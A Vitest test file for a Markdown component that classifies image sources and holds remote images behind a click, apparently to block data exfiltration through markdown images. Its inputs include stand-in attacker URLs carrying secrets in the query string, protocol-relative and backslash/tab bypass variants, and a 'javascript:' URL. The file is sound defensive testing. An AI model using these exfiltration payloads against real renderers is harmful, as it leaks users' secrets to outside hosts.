// @vitest-environment jsdom

import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { Markdown } from "./markdown";
import { classifyMarkdownImageSource } from "./markdown-image";

const reactTestEnvironment = globalThis as typeof globalThis & {
  IS_REACT_ACT_ENVIRONMENT: boolean;
};

describe("Markdown image sources", () => {
  const origin = "https://romeo.example";

  it("auto-loads only images served by Romeo itself", () => {
    expect(
      classifyMarkdownImageSource("/api/v1/files/file_1/content", origin),
    ).toEqual({ kind: "local", src: "/api/v1/files/file_1/content" });
    expect(
      classifyMarkdownImageSource(`${origin}/api/v1/files/f/content`, origin),
    ).toEqual({ kind: "local", src: `${origin}/api/v1/files/f/content` });
    expect(
      classifyMarkdownImageSource("https://attacker.example/?d=secret", origin),
    ).toEqual({
      host: "attacker.example",
      kind: "remote",
      src: "https://attacker.example/?d=secret",
    });
    expect(
      classifyMarkdownImageSource("//attacker.example/x.png", origin).kind,
    ).toBe("invalid");
    expect(
      classifyMarkdownImageSource("/\\attacker.example/x.png", origin).kind,
    ).toBe("invalid");
    expect(
      classifyMarkdownImageSource("/\t/attacker.example/x.png", origin).kind,
    ).toBe("invalid");
    expect(classifyMarkdownImageSource("javascript:alert(1)", origin)).toEqual({
      kind: "invalid",
    });
    expect(classifyMarkdownImageSource(undefined, origin).kind).toBe("invalid");
  });
});

describe("Markdown image rendering", () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    reactTestEnvironment.IS_REACT_ACT_ENVIRONMENT = true;
    container = document.createElement("div");
    document.body.append(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
    reactTestEnvironment.IS_REACT_ACT_ENVIRONMENT = false;
  });

  it("holds remote images behind an explicit click", () => {
    act(() => {
      root.render(
        <Markdown content="Summary ![chart](https://attacker.example/c.png?d=secret-token)" />,
      );
    });
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("attacker.example");
    expect(container.innerHTML).not.toContain("secret-token");

    const button = container.querySelector("button");
    expect(button).not.toBeNull();
    act(() => button?.click());

    const image = container.querySelector("img");
    expect(image?.getAttribute("src")).toBe(
      "https://attacker.example/c.png?d=secret-token",
    );
    expect(image?.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(image?.getAttribute("alt")).toBe("chart");
  });

  it("renders same-origin images inline", () => {
    act(() => {
      root.render(
        <Markdown content="![generated](/api/v1/files/file_1/content)" />,
      );
    });
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "/api/v1/files/file_1/content",
    );
  });
});
